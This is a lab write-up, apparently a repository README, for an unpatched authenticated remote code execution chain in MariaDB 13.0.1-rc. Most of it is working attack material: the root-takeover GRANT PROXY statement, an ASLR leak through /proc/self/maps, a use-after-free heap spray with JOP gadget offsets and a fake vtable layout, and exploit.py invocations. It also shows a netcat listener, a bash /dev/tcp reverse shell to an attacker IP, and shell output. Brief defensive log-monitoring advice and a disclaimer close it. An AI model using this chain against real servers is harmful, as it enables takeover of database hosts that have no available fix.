# MariaDB 13.0.1-rc — Remote Code Execution (RCE)

## Overview

An authenticated Remote Code Execution vulnerability in MariaDB 13.0.1-rc
that allows any low-privileged database user (USAGE only) to execute system
commands as `uid 999 (mysql)` on the unmodified, stock MariaDB image.

## Requirements

- A regular MariaDB account (USAGE only) + its password
- TCP reachability to port 3306

## Vulnerability Summary

**MariaDB 13.0.1-rc** — Authenticated remote code execution as `mysql`.

**Exploitation chain:**
1. `GRANT PROXY ... IDENTIFIED VIA ''` → any user becomes DBA
2. `LOAD DATA INFILE '/proc/self/maps'` → ASLR defeat
3. Allocate 128 MiB → dedicated mmap region
4. SYS_REFCURSOR UAF (0day) → heap spray → vtable hijack
5. JOP chain → `system("sh -c '<cmd>'")`

**Status:** unfixed — no CVE, no vendor advisory.

**Defense:** reduce exposure, set `secure_file_priv`, monitor logs.

## Exploitation Chain (5 Stages)

### 1. F-09 — Privilege Escalation (any user → DBA)

A single SQL statement hijacks the root account with an empty password:

    GRANT PROXY ON CURRENT_USER() TO 'root'@'%' IDENTIFIED VIA '';

- The empty authentication clause makes `LEX_USER::has_auth()` return `false`
- This skips `check_alter_user()` (the privilege check)
- Meanwhile `replace_user_table()` still applies the empty password
- Result: root's credentials are replaced
- **One statement, any authenticated user, every released MariaDB version**

### 2. ASLR Defeat via Server-Side File Read

Read the full memory layout of the mariadbd process **from within SQL**:

    LOAD DATA INFILE '/proc/self/maps' INTO TABLE ...

- Reveals `PIE base` and `libc base`
- Works because `secure_file_priv` is unset on the stock image
- Bases change on every run and are read from the live process

### 3. Dedicated mmap Region Setup

Allocate a 128 MiB buffer via a user variable:

    SET @fake = REPEAT(CHAR(0xDE), 134217728);

- glibc dedicates a standalone mmap region (data at `region+0x30`)
- Its address is discovered by diffing `/proc/self/maps` before/after — **from SQL**
- glibc reuses the **exact same slot** on reallocation → address stays stable

### 4. F-05 — SYS_REFCURSOR Use-After-Free (0day)

- `sp_cursor_array::get_cursor_by_ref()` returns an interior pointer into a `Dynamic_array`
- When the array grows, `my_realloc` frees the old backing storage
- The caller's cached pointer becomes **dangling**
- The freed chunk (1792 bytes = 16 cursors × 112) is reclaimed by a heap spray
- The payload places a controlled vtable pointer at offset `0x20`
- Virtual dispatch:

      result->prepare() → D2 → D1 → system("sh -c '<cmd>'")

### 5. JOP chain → system()

Two JOP gadgets from the stock mariadbd binary (**no ROP, no stack pivot**):

| Gadget | Offset | Instruction | Purpose |
|--------|--------|-------------|---------|
| D2 | PIE+0x80da77 | `call *0x100(%rax)` | Stack alignment fix |
| D1 | PIE+0xe3075b | `mov rdi,[rax+0xa8]; call [rax+0xa0]` | Load cmd ptr, call `system()` |

**Fake vtable V** lives in the 128 MiB buffer:

    V+0x20  = D2          (prepare() vtable slot)
    V+0xa0  = system()    (libc+0x5c560)
    V+0xa8  = V+0x140     (pointer to command string → rdi)
    V+0x100 = D1          (JOP dispatcher)
    V+0x140 = "sh -c '<cmd>'\0"

## Exploit

### Prerequisites

- A running MariaDB 13.0.1-rc instance
- A low-privileged MariaDB account (e.g., `userdb`)
- TCP access to port 3306
- A `mariadb`/`mysql` client on your machine
- Python 3

### 1. Verify the Server is Reachable

    mariadb -h 127.0.0.1 -P 3306 -uuserdb -p'userdb' testdb -e "SELECT 1;"

### 2. Start a Listener (for reverse shell)

In a separate terminal:

    nc -lvnp 9001

### 3. Run the Exploit

    python3 exploit.py --host 127.0.0.1 --port 3306 \
        --user userdb --password 'userdb' --database testdb \
        --lhost 172.17.0.1 --lport 9001 \
        --rsh-method devtcp

**Parameters:**

| Flag | Description |
|------|-------------|
| `--host` | MariaDB host (target) |
| `--port` | MariaDB port (default: 3306) |
| `--user` | Low-privileged MariaDB user |
| `--password` | User's password |
| `--database` | Database name (default: `testdb`) |
| `--lhost` | Your listener IP (enables reverse-shell mode) |
| `--lport` | Your listener port (default: 4444) |
| `--rsh-method` | `devtcp` \| `mkfifo` \| `nc` \| `python` |
| `--command` | Single command to run (instead of reverse shell) |
| `--no-restore` | Skip restoring root's password after F-09 |

### 4. Expected Output

    [*] Reverse shell mode -> 172.17.0.1:9001 (devtcp)
    [*] MariaDB 13.0.1-rc RCE — PURE SQL (fully remote)
    [*] Target: userdb@127.0.0.1:3306/testdb
    [*] Command: setsid bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1' </dev/null >/dev/null 2>&1
    [+] root accessible with empty password (F-09 already applied)
    [*] Step 2: creating spray128 / grow5 / uaf5
    [+] functions created
    [*] Step 3: reading /proc/self/maps from SQL
    [+] PIE base  0x55fab2836000
    [+] libc base 0x7f423cf4a000
    [+] D2=0x55fab3043a77  D1=0x55fab366675b  system=0x7f423cfa6560
    [*] Step 4: allocating @fake buffer
    [+] @fake region found with 128 MiB: 0x7741dfffe000
    [+] V (fake vtable) = 0x7741dffff030
    [*] Step 5: writing JOP layout via SQL
    [+] slot stable: V = 0x7741dffff030
    [+] reclaim payload ready (V=0x7741dffff030 at offset 0x20)
    [*] Restoring root to labpass (F-09 -> reversible)
    [+] root restored to labpass

    [*] ============ FIRING (CALL uaf5) ============
    [*] Listener expected on 172.17.0.1:9001
    [*] session died as expected after RCE: no sentinel within 10s; got: b''

    [+] ===========================================
    [+]  EXPLOIT COMPLETE (pure SQL, fully remote)
    [+]  root restored to labpass — next run is clean
    [+] ===========================================

### 5. Catch the Shell

On your listener terminal:

    connect to [172.17.0.1] from (UNKNOWN) [172.18.0.2] 41730
    bash: cannot set terminal process group (181): Inappropriate ioctl for device
    bash: no job control in this shell
    mysql@022467ecb947:~$ whoami
    mysql
    mysql@022467ecb947:~$ id
    uid=999(mysql) gid=999(mysql) groups=999(mysql)

### 6. Upgrade to a Full TTY (optional)

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    # Ctrl+Z
    stty raw -echo; fg
    # Enter
    export TERM=xterm
    export SHELL=/bin/bash

### 7. One-Shot Command Mode

If you only need to run a single command (no reverse shell):

    python3 exploit.py --host 127.0.0.1 --port 3306 \
        --user userdb --password 'userdb' --database testdb \
        --command "id > /tmp/pwned"

To verify, read the marker:

    cat /tmp/pwned

## Note on the Exploit Variant

The public PoC (`exploit.py` from the upstream repository) demonstrates
RCE by writing a marker file. It does not provide an interactive shell.

The version used here was **modified to support a reverse shell**, so that
the RCE can be interactively observed from a listener. The underlying
exploitation chain (F-09 → ASLR defeat → mmap setup → F-05 UAF → JOP)
is unchanged.

## Impact

- System command execution as `uid 999 (mysql)`
- Requires no special privileges — any MariaDB user suffices
- ASLR provides no protection (fully bypassed)
- Works against the **unmodified stock image**

## Affected Components

| Vulnerability | Status | Scope |
|---------------|--------|-------|
| F-09 (priv-esc) | **Unfixed** as of 2026-08-03 | Every released version (13.0.1 through 10.6.27) |
| F-05 (UAF) | **0day, unfixed** as of 2026-08-03 | Zero commits to `sql/sp_cursor.{cc,h}` between the 13.0.1 tag and HEAD |

## Defensive Measures

1. **Reduce database exposure** — never expose 3306 to untrusted networks
2. **Credential hygiene** — no shared USAGE-only accounts
3. **Monitor logs** for:
   - `GRANT PROXY ... IDENTIFIED VIA ''`
   - `LOAD DATA INFILE '/proc/self/maps'`
   - `SET @fake = REPEAT(..., 134217728)`
4. **Watch for official advisories** and CVE publication
5. **Apply least privilege** — do not grant `FILE` priv to any user
6. **Set `secure_file_priv`** to a specific path

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| `ERROR 2013 (HY000): Lost connection` | mariadbd not ready after previous crash | Wait 15–30s, or use `wait_for_server` retry |
| `[-] Cannot obtain root access` | F-09 failed (permissions or state) | Check user has `USAGE` only; verify `root@%` exists |
| `[!] 128 MiB did not yield a new region` | glibc `mmap_threshold` grew after prior runs | Restart the service, or retry with 256/512 MiB |
| Reverse shell dies immediately | `init: true` not applied | Add `init: true` to the service definition |

## Simplified Explanation

    Core problem:

    MariaDB stores cursors in a dynamic array.
    When the array grows, the old backing storage is freed.
    But a stale pointer is still cached somewhere → use-after-free.

    Attacker:
    1. Fills the freed chunk with controlled data
    2. Plants a fake pointer where a vtable pointer is expected
    3. When MariaDB performs a virtual call, it jumps into attacker code
    4. The chosen code calls system() → command execution

    Why it's serious:
    - Any database user suffices
    - ASLR provides no protection
    - Works on the stock official image

## References

- **Public PoC available**: https://github.com/dinosn/mariadb-13-rce-lab
- No CVE assigned yet
- No vendor advisory from MariaDB
- No official patch released
- Vulnerability documented only on **13.0.1-rc** (a release candidate, not production)
- Unknown whether stable branches (11.x / 10.x) are affected

## Disclaimer

This lab is **for educational purposes only**. The vulnerability is unfixed,
and using it against systems you do not own or have explicit permission to
test may violate local and international laws. Use only in an isolated
environment you fully control.
